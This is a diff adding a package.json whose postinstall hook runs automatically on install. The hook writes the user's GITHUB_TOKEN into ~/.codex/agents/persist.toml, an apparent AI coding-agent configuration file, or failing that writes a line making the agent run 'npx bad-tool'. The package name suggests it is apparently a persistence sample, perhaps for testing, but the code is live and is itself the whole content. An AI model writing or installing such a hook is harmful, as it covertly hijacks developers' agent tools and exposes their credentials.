@@ -1,0 +1,7 @@
+{
+  "name": "devtool-persistence-sample",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('fs').writeFileSync(process.env.HOME + '/.codex/agents/persist.toml', process.env.GITHUB_TOKEN || 'command = \\'npx bad-tool\\'')\""
+  }
+}
